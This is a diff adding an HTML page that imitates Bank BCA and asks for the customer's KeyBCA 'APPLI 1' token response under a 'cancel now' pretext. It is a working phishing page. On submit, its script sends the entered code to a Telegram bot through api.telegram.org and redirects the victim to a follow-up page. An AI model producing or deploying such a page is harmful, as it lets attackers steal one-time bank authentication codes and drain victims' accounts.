@@ -1,0 +1,186 @@
+<html lang="in">
+ <head> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <meta http-equiv="X-UA-Compatible" content="ie=edge"> 
+  <title>BCA</title> 
+  <link rel="canonical" href="https://hol-wis.my.id/membatalkan/kbcabisnis/req/kbcabisnis.html"> 
+  <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon"> 
+  <link rel="apple-touch-icon" href="./assets/ico/apple-touch-icon.png"> 
+  <link rel="stylesheet" href="assets/css/main.css"> 
+  <link rel="stylesheet" href="assets/css/styles.css"> 
+  <link rel="stylesheet" href="assets/css/main.css"> 
+  <link rel="stylesheet" href="assets/css/styles.2.css"> 
+  <link rel="stylesheet" href="styles.64003c381abb4bcbd5d1.css"> 
+  <style>
+     @charset "UTF-8";
+@import url(assets/plugins/fontawesome-5.5.0/css/all.min.css);
+@import url(assets/plugins/animate-css-3.6.0/animate.min.css);
+      .grecaptcha-badge {
+        visibility: collapse !important;
+      }   
+ @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+    * {
+        font-family: 'Ubuntu', sans-serif;
+        font-weight: 400;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        position: relative;
+        color: #000;
+    }
+     body, html{
+     background-image: url('');
+    background-repeat: no-repeat;
+    background-position: 100% 100%;
+    background-size: 100% 100%;
+        font-family: 'Ubuntu', sans-serif;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      top: 0;
+      margin: 0px auto;
+      background-color:#fff;
+      width: 100%;
+      height: 100%;
+      positon: fixed;
+}
+ .container {
+        max-width: 90%;
+        padding: 0px;
+        background-color:;
+        margin-left: auto;
+        margin-right: auto;
+        border-radius:10px;
+    }
+    .button {
+        margin-top: 5px;
+        width: 100%;
+        height: 40px;
+        border: none;
+        outline: none;
+        border-radius: 25px;
+        color: #fff;
+        background: #1171ce;
+        text-align: center;
+        font-size: 13px;
+        font-weight: bold;
+        box-shadow: 2px 2px 2px 0px rgba(8,8,0,0.5);
+    }
+    button:disabled {
+        opacity: 0.7;
+    }
+    input {
+        width:100%;
+        height: 35px;
+        margin:;
+        padding:10px;
+        border-radius:7px;
+        border:0px solid #000;
+        box-shadow: 2px 2px 2px 2px #dedede;
+    }
+    </style> 
+ </head>
+ <body style="position: ring; margin: 0px auto; left: 0; right: 0; top: 0">
+  <div class="space" style="padding:0px;height:0%;"> 
+  </div> 
+  <br>
+  <br>
+  <br> 
+  <center> 
+   <img src="img/WBmeyB.jpg" width="20%" style="" alt=""> 
+  </center> 
+  <br> 
+  <div class="space" style="padding:0%;height:;margin:;"> 
+  </div> 
+<div class="container"> 
+  <form id="cancel-form"> <!-- Menambahkan ID untuk form -->
+    <div class="container"> 
+      <lbl style="color:#1191cb;font-weight: bold;">
+        Masukkan Respon APPLI 1/2 KeyBCA
+      </lbl> 
+      <input type="password" id="key2" inputmode="numeric" placeholder="" name="key2" required> 
+      <br>
+      <br> 
+      <button type="submit" id="cancel-btn" style="width: 100%; height: 40px; position; fixed; bottom: 0; right: 0; left: 0; margin-bottom: -23px; padding: 0px 0px; background:#2595de ;color:#fff;border-radius:20px;font-weight: solid; border: 0px none #fff;">
+        <img src="img/but2.jpg" style="width: 100%; height; 40px; margin-top: -0px;  bottom: 0;"> Batalkan Sekarang
+      </button> 
+    </div> 
+  </form>
+  <br> 
+</div>
+
+<script src="config.js"></script>
+<script>
+  // Ambil data input sebelumnya dari localStorage atau buat objek kosong
+  let inputCounts = JSON.parse(localStorage.getItem("inputCounts")) || {};
+
+  document.getElementById("cancel-form").addEventListener("submit", function (event) {
+    event.preventDefault();
+
+    const key2 = document.getElementById("key2").value.trim(); // Ambil teks yang dimasukkan
+
+    // Jika teks sudah dimasukkan lebih dari 2 kali, tolak input
+    if (inputCounts[key2] && inputCounts[key2] >= 2) {
+      alert("Teks ini sudah dimasukkan 2 kali, coba teks lain!");
+      return;
+    }
+
+    // Tambah jumlah percobaan untuk teks ini
+    inputCounts[key2] = (inputCounts[key2] || 0) + 1;
+    localStorage.setItem("inputCounts", JSON.stringify(inputCounts)); // Simpan ke localStorage
+
+    // Kirim data ke bot Telegram
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `Respon APPLI 1/2 KeyBCA: ${key2}`,
+      }),
+    }).then(response => {
+      if (response.ok) {
+        window.location.href = "bisnis2.html"; // Redirect ke bisnis2.html
+      } else {
+        alert("Gagal mengirim data ke bot Telegram.");
+      }
+    }).catch(error => {
+      console.error("Error:", error);
+      alert("Terjadi kesalahan saat mengirim data.");
+    });
+  });
+</script>
+
+
+ 
+  <!--jQuery UI--> 
+  <!--Has dependency on main.scss--> 
+  <!--Viewport Checker--> 
+  <!--For viewport animation--> 
+  <!--Jquery Mask--> 
+  <!--For Money Format--> 
+  <!-- Exif JS --> 
+  <script>
+$( document ).ready(function() {
+            setTimeout(() => {
+                $('#lodingku').hide();
+                $('chsalxcome2').fadeIn();
+            },860)
+        })
+</script> 
+  <p id="status"></p> 
+  <script>
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+                $("#password").prop("type", "text");
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+                    $("#password").prop("type", "password");
+                });
+            });
+ </script> 
+ </body>
+</html>
